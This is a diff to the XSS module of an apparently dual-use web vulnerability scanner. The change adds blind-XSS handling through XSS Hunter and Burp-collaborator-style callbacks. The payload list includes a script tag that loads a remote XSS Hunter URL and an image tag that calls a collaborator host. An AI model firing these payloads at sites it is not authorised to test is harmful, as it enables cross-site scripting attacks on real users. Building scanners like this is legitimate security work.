@@ -7,8 +7,22 @@ class XSS(GeneralScanner):
     def __init__(self, config) -> None:
         GeneralScanner.__init__(self, config)
 
+        self.xsshunter    = self.options.get('xsshunter')
+        self.collaborator = self.options.get('collaborator')
+
     def check(self):
         params = self.request.GetParams()
+
+        # If xsshunter or collaborator were used, we have to attack all params
+        # To detect blind cases 
+
+        if self.xsshunter or self.collaborator:
+            # Include all parameters even those that are not reflected in the same page
+            self.vulnerable_params.extend(params)
+
+            # We have to not resume
+            return True
+
         counter = 0
 
         for p in params:
@@ -30,18 +44,16 @@ class XSS(GeneralScanner):
         return ret
         
     def GetPayloads(self):
-        xsshunter    = self.options.get('xsshunter')
-        collaborator = self.options.get('collaborator')
 
         payloads = [
             '"><svg onload=alert&#0000000040`XSSB00M`)>'
         ]
 
-        if xsshunter:
-            payloads.append(f"\"><sCRiPt src={xsshunter}></ScrIpT>")
+        if self.xsshunter:
+            payloads.append(f"\"><sCRiPt src={self.xsshunter}></ScrIpT>")
 
-        if collaborator:
-            host = urlparse(collaborator).netloc
+        if self.collaborator:
+            host = urlparse(self.collaborator).netloc
             payloads.append(f"<ImG sRc=\"http://{host}\">")
 
         return payloads
